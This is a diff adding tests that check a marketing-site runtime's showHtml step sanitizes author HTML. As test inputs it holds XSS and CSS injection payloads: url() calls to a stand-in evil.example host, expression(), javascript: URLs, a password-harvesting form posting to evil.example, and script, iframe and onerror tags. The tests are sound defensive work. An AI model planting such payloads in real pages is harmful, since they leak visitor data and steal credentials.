@@ -402,3 +402,95 @@ describe('the popup image refuses the http: scheme (AGL-1725)', () => {
     expect(img?.getAttribute('alt')).toBe('')
   })
 })
+
+/**
+ * `showHtml` runs the SHARED author-HTML sanitizer (AGL-2486).
+ *
+ * These drive `MarketingSiteRuntime` rather than calling
+ * `sanitizeAuthorHtml` directly, on purpose. The sanitizer has its own unit
+ * suite; what was wrong here was never that the function misbehaved, it was
+ * that this step called a DIFFERENT one — so the only assertion that can
+ * catch a regression is one that reads the DOM this step actually appends to
+ * the visitor's page. Pointing `container.innerHTML` back at DOMPurify turns
+ * every case below red; passing the string through `sanitizeAuthorHtml`
+ * somewhere other than this step turns none of them red.
+ */
+describe('showHtml sanitization on the real render path (AGL-2486)', () => {
+  let unmount: () => void
+
+  const showHtml = (html: string) => {
+    const utils = runEngine([{ event: 'pageVisit', steps: [{ type: 'showHtml', html }] }])
+    unmount = utils.unmount
+  }
+
+  /** The nodes this step appended to `document.body`, as the visitor holds them. */
+  const injected = (): HTMLElement =>
+    document.body.lastElementChild as HTMLElement
+
+  afterEach(() => {
+    unmount?.()
+    document.body.innerHTML = ''
+  })
+
+  it('neuters an http: url() in a style attribute', () => {
+    showHtml('<div style="background-image:url(http://evil.example/p.png?c=1)">x</div>')
+    const div = injected().querySelector('div') as HTMLElement
+    expect(div.getAttribute('style')).toContain('about:invalid')
+    expect(div.getAttribute('style')).not.toContain('evil.example')
+  })
+
+  it('decodes a character reference before judging the scheme', () => {
+    // DOMPurify emitted a literal `http://…` here: it never decoded the
+    // reference, so its output was MORE dangerous than its input looked.
+    showHtml('<div style="background:url(&#104;ttp://evil.example/x.png)">x</div>')
+    const div = injected().querySelector('div') as HTMLElement
+    expect(div.getAttribute('style')).not.toContain('evil.example')
+  })
+
+  it.each([
+    ['@import', '@import url(https://evil.example/x.css)'],
+    ['expression()', 'width:expression(alert(1))'],
+    ['-moz-binding', '-moz-binding:url(http://evil.example/x.xml#e)'],
+    ['behavior:', 'behavior:url(#default#time2)'],
+    ['javascript: url()', 'background:url(javascript:alert(1))'],
+  ])('drops the whole style attribute for %s', (_name, css) => {
+    showHtml(`<div style="${css}">x</div>`)
+    const div = injected().querySelector('div') as HTMLElement
+    expect(div.hasAttribute('style')).toBe(false)
+    // The element and its words survive — this refuses CSS, not content.
+    expect(div.textContent).toBe('x')
+  })
+
+  it('drops a credential-harvesting form', () => {
+    // The old FORBID_TAGS list omitted `form`, alone among this repo's
+    // author-HTML configs, so this markup reached the page intact.
+    showHtml('<form action="https://evil.example"><input name="p" type="password"></form>')
+    expect(injected().querySelector('form')).toBeNull()
+    expect(injected().querySelector('input')).toBeNull()
+  })
+
+  it('still refuses everything the old config refused', () => {
+    showHtml('<img src="x" onerror="alert(1)"><script>alert(2)</script><iframe src="https://e.example"></iframe>')
+    const root = injected()
+    expect(root.querySelector('script')).toBeNull()
+    expect(root.querySelector('iframe')).toBeNull()
+    expect(root.querySelector('img')?.hasAttribute('onerror')).toBe(false)
+  })
+
+  it('leaves benign author styling byte-identical', () => {
+    // The no-regression half: real inline styling must survive untouched, or
+    // this fix blanks somebody's site.
+    showHtml('<div style="color:#333;margin:8px auto;font-size:14px">hello</div>')
+    const div = injected().querySelector('div') as HTMLElement
+    expect(div.getAttribute('style')).toBe('color:#333;margin:8px auto;font-size:14px')
+    expect(div.textContent).toBe('hello')
+  })
+
+  it('keeps a first-party and an https third-party url()', () => {
+    // Deliberately NOT blocked: the site owner choosing a host for their own
+    // visitors is the AGL-1725 actor analysis, not a scheme problem.
+    showHtml('<div style="background-image:url(https://cdn.example/p.png)">x</div>')
+    const div = injected().querySelector('div') as HTMLElement
+    expect(div.getAttribute('style')).toContain('https://cdn.example/p.png')
+  })
+})
